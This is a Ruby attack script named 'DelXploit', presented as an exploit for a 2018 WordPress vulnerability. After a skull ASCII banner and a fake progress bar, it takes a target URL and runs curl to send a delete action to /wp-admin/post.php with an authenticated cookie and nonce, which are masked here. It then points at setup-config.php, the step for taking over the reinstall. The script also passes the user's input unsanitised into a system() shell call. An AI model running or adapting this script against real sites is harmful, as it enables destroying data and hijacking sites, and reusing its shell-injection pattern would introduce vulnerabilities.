require 'open-uri'
require 'colorize'
require 'progress_bar'
require 'terminal-table'

class Design


	def headDeath

		head = """
		\t\t\t\t\t\t
									 uuuuuuu
							             uu$$$$$$$$$$$uu
							          uu$$$$$$$$$$$$$$$$$uu
							         u$$$$$$$$$$$$$$$$$$$$$u
							        u$$$$$$$$$$$$$$$$$$$$$$$u
							       u$$$$$$$$$$$$$$$$$$$$$$$$$u
							       u$$$$$$$$$$$$$$$$$$$$$$$$$u
							       u$$$$$$     $$$     $$$$$$u
							        $$$$       u$u       $$$$ 
							        $$$u       u$u       u$$$
							        $$$u      u$$$u      u$$$
							          $$$$uu$$$   $$$uu$$$$ 
							           $$$$$$$     $$$$$$$ 
							            u$$$$$$$u$$$$$$$u
							             u$ $ $ $ $ $ $u
							  uuu        $$u$ $ $ $ $u$$       uuu
							 u$$$$        $$$$$u$u$u$$$       u$$$$
							  $$$$$uu       $$$$$$$$$      uu$$$$$$
							u$$$$$$$$$$$uu           uuuu$$$$$$$$$$
							$$$$  $$$$$$$$$$uuu   uu$$$$$$$$$  $$$
							          $$$$$$$$$$$uu   $
							           uuuu   $$$$$$$$$$uuu
							  u$$$uuu$$$$$$$$$uu  $$$$$$$$$$$uuu$$$
							  $$$$$$$$$$                 $$$$$$$$$$$
							    $$$$$                         $$$$
							     $$$                          $$$$




		""".green
		print head

		r = open("http://artii.herokuapp.com/make?text=         DelXploit&font=univers").read
		puts r.red




	end






end

class Exploit
	attr_accessor :uri

	def initialize(uri)
		@uri = uri

	end

	def request
		system("curl -v '#{uri}/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=delete&_wpnonce=***'")
	end







end


#create instance design
design = Design.new

#puts design ascii
puts design.headDeath
bar = ProgressBar.new

100.times do
  sleep 0.1
  bar.increment! 5
end

system("clear")

table = Terminal::Table.new :title => "DelXploit", :headings => ['Dev By Ruby', 'Exploit: Cve 2018-06-27']
table.style = {:width => 60, :padding_left => 3, :border_x => "=", :border_i => "x"}




puts table

print("URL: ")
uri = gets.chomp

if uri != nil
	#instance request
	exploit = Exploit.new(uri)
	exploit.request
	puts "probably vulnerability -> #{uri}/wp-admin/setup-config.php".yellow


else
	puts "insert uri :'(".red


end



